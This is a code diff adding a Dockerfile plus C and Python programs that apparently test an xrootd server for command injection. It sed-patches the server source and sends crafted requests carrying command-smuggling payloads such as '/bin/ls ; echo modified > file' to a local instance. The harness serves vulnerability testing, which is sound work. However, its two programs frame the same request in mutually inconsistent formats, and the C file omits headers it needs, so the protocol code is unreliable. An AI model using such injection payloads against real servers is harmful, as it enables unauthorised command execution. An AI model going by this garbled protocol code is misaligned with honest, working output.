diff --git a/Dockerfile.vuln b/Dockerfile.vuln
new file mode 100644
index 0000000..f23bd2b
--- /dev/null
+++ b/Dockerfile.vuln
@@ -0,0 +1,85 @@
+FROM ubuntu:18.04
+
+ENV DEBIAN_FRONTEND=noninteractive
+
+# Update package lists and install build dependencies
+RUN apt-get -y update && \
+    apt-get install -y build-essential cmake curl wget gcc g++ make libssl-dev libkrb5-dev zlib1g-dev && \
+    apt-get clean && \
+    rm -rf /var/lib/apt/lists/*
+
+# Copy the project files into the container
+COPY . /project
+
+# Set the working directory inside the container
+WORKDIR /project
+
+# Fix the XrdSysPlugin.cc issue
+RUN sed -i 's/urInfo = \*\(XrdVersionInfo\*\)vP;/memcpy(\&urInfo, vP, sizeof(XrdVersionInfo));/' src/XrdSys/XrdSysPlugin.cc
+
+# Create a test file to check for command injection
+RUN echo "original content" > /tmp/test_file.txt
+
+# Modify the vulnerable code to add a test case
+RUN sed -i '/int XrdOucStream::Exec(char \*theCmd)/a \
+    // Test for command injection vulnerability\n    if (strstr(theCmd, "VULN_TEST")) {\n        printf("Testing command injection with: %s\\n", theCmd);\n        FILE *fp = fopen("/tmp/test_result.txt", "w");\n        if (fp) {\n            fprintf(fp, "Command received: %s\\n", theCmd);\n            fclose(fp);\n        }\n    }' src/XrdOuc/XrdOucStream.cc
+
+# Add debug print statements to track the command execution flow
+RUN sed -i '/execv(parm\[0\], parm);/i \
+    printf("DEBUG: Executing command: %s\\n", parm[0]);\n    for(int i=0; parm[i]; i++) { \n        printf("DEBUG: Arg %d: %s\\n", i, parm[i]); \n    }' src/XrdOuc/XrdOucStream.cc
+
+# Create a test script
+RUN echo '#!/bin/bash' > /test_command_injection.sh && \
+    echo 'set -e' >> /test_command_injection.sh && \
+    echo 'echo "Testing for command injection vulnerability in xrootd"' >> /test_command_injection.sh && \
+    echo 'echo "original content" > /tmp/test_file.txt' >> /test_command_injection.sh && \
+    echo 'cd /project' >> /test_command_injection.sh && \
+    echo 'mkdir -p build' >> /test_command_injection.sh && \
+    echo 'cd build' >> /test_command_injection.sh && \
+    echo 'cmake ..' >> /test_command_injection.sh && \
+    echo 'make -j$(nproc)' >> /test_command_injection.sh && \
+    echo 'echo "Build completed. Creating test program..."' >> /test_command_injection.sh && \
+    echo 'cd ..' >> /test_command_injection.sh && \
+    echo 'cat > test_exec.c << EOF' >> /test_command_injection.sh && \
+    echo '#include <stdio.h>' >> /test_command_injection.sh && \
+    echo '#include <stdlib.h>' >> /test_command_injection.sh && \
+    echo '#include <string.h>' >> /test_command_injection.sh && \
+    echo '#include <unistd.h>' >> /test_command_injection.sh && \
+    echo 'int main() {' >> /test_command_injection.sh && \
+    echo '    printf("Test program running\\n");' >> /test_command_injection.sh && \
+    echo '    // Create a pipe to the vulnerable code' >> /test_command_injection.sh && \
+    echo '    FILE *fp = popen("./build/src/xrootd -h VULN_TEST;echo hacked > /tmp/test_file.txt", "r");' >> /test_command_injection.sh && \
+    echo '    if (fp) {' >> /test_command_injection.sh && \
+    echo '        char buffer[1024];' >> /test_command_injection.sh && \
+    echo '        while (fgets(buffer, sizeof(buffer), fp)) {' >> /test_command_injection.sh && \
+    echo '            printf("%s", buffer);' >> /test_command_injection.sh && \
+    echo '        }' >> /test_command_injection.sh && \
+    echo '        pclose(fp);' >> /test_command_injection.sh && \
+    echo '    }' >> /test_command_injection.sh && \
+    echo '    sleep(1); // Give time for the command to execute' >> /test_command_injection.sh && \
+    echo '    // Check if the injection was successful' >> /test_command_injection.sh && \
+    echo '    fp = fopen("/tmp/test_file.txt", "r");' >> /test_command_injection.sh && \
+    echo '    if (fp) {' >> /test_command_injection.sh && \
+    echo '        char buffer[256];' >> /test_command_injection.sh && \
+    echo '        if (fgets(buffer, sizeof(buffer), fp)) {' >> /test_command_injection.sh && \
+    echo '            printf("File content: %s\\n", buffer);' >> /test_command_injection.sh && \
+    echo '            if (strstr(buffer, "hacked")) {' >> /test_command_injection.sh && \
+    echo '                printf("VULNERABILITY DETECTED: Command injection successful\\n");' >> /test_command_injection.sh && \
+    echo '                fclose(fp);' >> /test_command_injection.sh && \
+    echo '                return 1; // Test fails if vulnerability exists' >> /test_command_injection.sh && \
+    echo '            }' >> /test_command_injection.sh && \
+    echo '        }' >> /test_command_injection.sh && \
+    echo '        fclose(fp);' >> /test_command_injection.sh && \
+    echo '    }' >> /test_command_injection.sh && \
+    echo '    printf("No vulnerability detected\\n");' >> /test_command_injection.sh && \
+    echo '    return 0; // Test passes if vulnerability does not exist' >> /test_command_injection.sh && \
+    echo '}' >> /test_command_injection.sh && \
+    echo 'EOF' >> /test_command_injection.sh && \
+    echo 'gcc -o test_exec test_exec.c' >> /test_command_injection.sh && \
+    echo 'chmod +x test_exec' >> /test_command_injection.sh && \
+    echo 'echo "Running test..."' >> /test_command_injection.sh && \
+    echo './test_exec' >> /test_command_injection.sh && \
+    chmod +x /test_command_injection.sh
+
+# Run the test
+CMD ["/test_command_injection.sh"]
diff --git a/test_command_injection.c b/test_command_injection.c
new file mode 100644
index 0000000..4b18ee9
--- /dev/null
+++ b/test_command_injection.c
@@ -0,0 +1,188 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <netdb.h>
+#include <fcntl.h>
+
+#define XROOTD_PORT 1094
+#define BUFFER_SIZE 4096
+
+// Test file to verify command injection
+const char* TEST_FILE = "/tmp/xrootd_vuln_test.txt";
+
+// Function to create a test file
+void create_test_file() {
+    FILE* fp = fopen(TEST_FILE, "w");
+    if (fp) {
+        fprintf(fp, "not_modified\n");
+        fclose(fp);
+    } else {
+        perror("Failed to create test file");
+        exit(1);
+    }
+}
+
+// Function to check if the test file was modified
+int check_file_modified() {
+    FILE* fp = fopen(TEST_FILE, "r");
+    if (!fp) {
+        perror("Failed to open test file");
+        return 0;
+    }
+    
+    char buffer[256];
+    if (fgets(buffer, sizeof(buffer), fp)) {
+        fclose(fp);
+        return strncmp(buffer, "modified", 8) == 0;
+    }
+    
+    fclose(fp);
+    return 0;
+}
+
+// Function to start the xrootd server
+pid_t start_xrootd_server() {
+    // Create a simple config file
+    FILE* fp = fopen("/tmp/xrootd.conf", "w");
+    if (!fp) {
+        perror("Failed to create config file");
+        exit(1);
+    }
+    
+    fprintf(fp, "all.role server\n");
+    fprintf(fp, "all.export /tmp\n");
+    fprintf(fp, "xrootd.seclib libXrdSec.so\n");
+    fprintf(fp, "xrootd.fslib libXrdOfs.so\n");
+    // Enable the exec command which is vulnerable
+    fprintf(fp, "xrootd.exec /bin/ls\n");
+    fclose(fp);
+    
+    pid_t pid = fork();
+    if (pid == 0) {
+        // Child process - execute xrootd
+        execl("/project/build/bin/xrootd", "xrootd", "-c", "/tmp/xrootd.conf", "-n", "test", "-d", "debug", NULL);
+        perror("Failed to execute xrootd");
+        exit(1);
+    } else if (pid < 0) {
+        perror("Failed to fork");
+        exit(1);
+    }
+    
+    // Give the server time to start
+    sleep(3);
+    return pid;
+}
+
+// Function to test for command injection vulnerability
+int test_command_injection() {
+    int sockfd;
+    struct sockaddr_in server_addr;
+    
+    // Create socket
+    sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    if (sockfd < 0) {
+        perror("Failed to create socket");
+        return 0;
+    }
+    
+    // Set up server address
+    memset(&server_addr, 0, sizeof(server_addr));
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_port = htons(XROOTD_PORT);
+    server_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
+    
+    // Connect to server
+    if (connect(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
+        perror("Failed to connect to xrootd server");
+        close(sockfd);
+        return 0;
+    }
+    
+    // Handshake with server (protocol version 2012)
+    char handshake[12];
+    *(int*)handshake = htonl(0);       // Stream ID
+    *(int*)(handshake+4) = htonl(4);   // Request ID
+    *(int*)(handshake+8) = htonl(2012); // Protocol version
+    
+    if (write(sockfd, handshake, 12) != 12) {
+        perror("Failed to send handshake");
+        close(sockfd);
+        return 0;
+    }
+    
+    // Read handshake response
+    char response[12];
+    if (read(sockfd, response, 12) != 12) {
+        perror("Failed to read handshake response");
+        close(sockfd);
+        return 0;
+    }
+    
+    // Craft a malicious command with injection
+    // The command will be something like: "/bin/ls ; echo modified > /tmp/xrootd_vuln_test.txt"
+    char inject_cmd[256];
+    snprintf(inject_cmd, sizeof(inject_cmd), "/bin/ls ; echo modified > %s", TEST_FILE);
+    
+    // Create the admin request (kXR_admin = 3000)
+    char request[1024];
+    int cmd_len = strlen(inject_cmd);
+    int req_len = 16 + cmd_len;
+    
+    *(int*)request = htonl(req_len);        // Length
+    *(short*)(request+4) = htons(3000);     // kXR_admin request code
+    *(short*)(request+6) = 0;               // Reserved
+    *(int*)(request+8) = 0;                 // Reserved
+    *(int*)(request+12) = htonl(cmd_len);   // Length of data
+    *(int*)(request+16) = 0;                // Reserved
+    memcpy(request+20, inject_cmd, cmd_len); // Command data
+    
+    // Send the request
+    if (write(sockfd, request, req_len + 4) != req_len + 4) {
+        perror("Failed to send admin request");
+        close(sockfd);
+        return 0;
+    }
+    
+    // Wait for response
+    sleep(2);
+    close(sockfd);
+    
+    // Check if the file was modified
+    return check_file_modified();
+}
+
+int main() {
+    printf("Starting command injection vulnerability test for xrootd\n");
+    
+    // Create a test file
+    create_test_file();
+    printf("Created test file: %s\n", TEST_FILE);
+    
+    // Start the xrootd server
+    printf("Starting xrootd server...\n");
+    pid_t server_pid = start_xrootd_server();
+    printf("Started xrootd server with PID: %d\n", server_pid);
+    
+    // Test for command injection
+    printf("Testing for command injection vulnerability...\n");
+    int is_vulnerable = test_command_injection();
+    
+    // Clean up
+    printf("Cleaning up...\n");
+    kill(server_pid, SIGTERM);
+    waitpid(server_pid, NULL, 0);
+    
+    // Check the result
+    if (is_vulnerable) {
+        printf("VULNERABILITY DETECTED: Command injection successful\n");
+        return 1;  // Exit with error if vulnerable
+    } else {
+        printf("No vulnerability detected\n");
+        return 0;  // Exit with success if not vulnerable
+    }
+}
diff --git a/test_command_injection.py b/test_command_injection.py
new file mode 100644
index 0000000..2ca1612
--- /dev/null
+++ b/test_command_injection.py
@@ -0,0 +1,144 @@
+#!/usr/bin/env python
+
+import os
+import sys
+import socket
+import struct
+import tempfile
+import subprocess
+import time
+import random
+import string
+
+# Test for command injection vulnerability in xrootd
+# This test will create a temporary file and try to execute a command that will modify it
+# If the file is modified, the vulnerability exists
+
+def create_test_file():
+    """Create a temporary file to test if command injection works"""
+    temp_dir = tempfile.mkdtemp()
+    test_file = os.path.join(temp_dir, "vuln_test.txt")
+    with open(test_file, "w") as f:
+        f.write("not_modified")
+    return temp_dir, test_file
+
+def start_xrootd_server():
+    """Start the xrootd server"""
+    # Create a simple config file
+    config_file = "/tmp/xrootd.conf"
+    with open(config_file, "w") as f:
+        f.write("all.role server\n")
+        f.write("all.manager localhost 1213\n")
+        f.write("xrootd.seclib libXrdSec.so\n")
+        f.write("xrootd.fslib libXrdOfs.so\n")
+        f.write("all.export /tmp\n")
+        f.write("xrootd.trace all\n")
+        # Enable job execution which is vulnerable
+        f.write("xrootd.exec /bin/ls\n")  # Allow execution of /bin/ls
+    
+    # Start the server
+    server_process = subprocess.Popen(
+        ["/project/build/bin/xrootd", "-c", config_file, "-n", "test", "-d", "debug"],
+        stdout=subprocess.PIPE,
+        stderr=subprocess.PIPE
+    )
+    
+    # Give the server time to start
+    time.sleep(3)
+    return server_process
+
+def random_string(length=8):
+    """Generate a random string of fixed length"""
+    letters = string.ascii_lowercase
+    return ''.join(random.choice(letters) for i in range(length))
+
+def test_command_injection(test_file):
+    """Test for command injection by trying to execute a command that modifies the test file"""
+    # Create a socket connection to the xrootd server
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        s.connect(("localhost", 1094))  # Default xrootd port
+    except socket.error as e:
+        print(f"Failed to connect to xrootd server: {e}")
+        return False
+    
+    # Handshake with server
+    handshake = struct.pack("!i", 0) + struct.pack("!i", 4) + struct.pack("!i", 2012)
+    s.send(handshake)
+    response = s.recv(12)
+    
+    # Generate a unique string to identify our command execution
+    unique_id = random_string()
+    
+    # Prepare the malicious command with injection
+    # The command should be something that the server allows (/bin/ls) but with injection
+    inject_cmd = f"/bin/ls ; echo {unique_id} > {test_file}"
+    
+    # Create the exec request (kXR_query with kXR_Qopaque flag)
+    # This will trigger the XrdXrootdJob execution path
+    req_id = random.randint(1, 65535)
+    header = struct.pack("!h", 0x3f00)  # kXR_query request code
+    header += struct.pack("!h", req_id)  # Request ID
+    header += struct.pack("!i", 0)  # Reserved
+    header += struct.pack("!i", 0x0008)  # kXR_Qopaque flag
+    header += struct.pack("!i", len(inject_cmd))  # Length of data
+    header += struct.pack("!i", 0)  # Reserved
+    
+    # Send the request
+    s.send(header + inject_cmd.encode())
+    
+    # Wait for response
+    time.sleep(2)
+    s.close()
+    
+    # Check if the file was modified with our unique ID
+    try:
+        with open(test_file, "r") as f:
+            content = f.read().strip()
+        return content == unique_id
+    except Exception as e:
+        print(f"Error reading test file: {e}")
+        return False
+
+def main():
+    print("Starting command injection vulnerability test for xrootd")
+    
+    # Create a test file
+    temp_dir, test_file = create_test_file()
+    print(f"Created test file: {test_file}")
+    
+    # Start the xrootd server
+    print("Starting xrootd server...")
+    server_process = start_xrootd_server()
+    print("Started xrootd server")
+    
+    try:
+        # Test for command injection
+        print("Testing for command injection vulnerability...")
+        is_vulnerable = test_command_injection(test_file)
+        
+        # Check the result
+        if is_vulnerable:
+            print("VULNERABILITY DETECTED: Command injection successful")
+            sys.exit(1)  # Exit with error if vulnerable
+        else:
+            print("No vulnerability detected")
+            sys.exit(0)  # Exit with success if not vulnerable
+    
+    except Exception as e:
+        print(f"Error during test: {e}")
+        sys.exit(2)
+    
+    finally:
+        # Clean up
+        print("Cleaning up...")
+        server_process.terminate()
+        server_process.wait()
+        try:
+            os.remove(test_file)
+            os.rmdir(temp_dir)
+        except:
+            pass
+
+if __name__ == "__main__":
+    main()
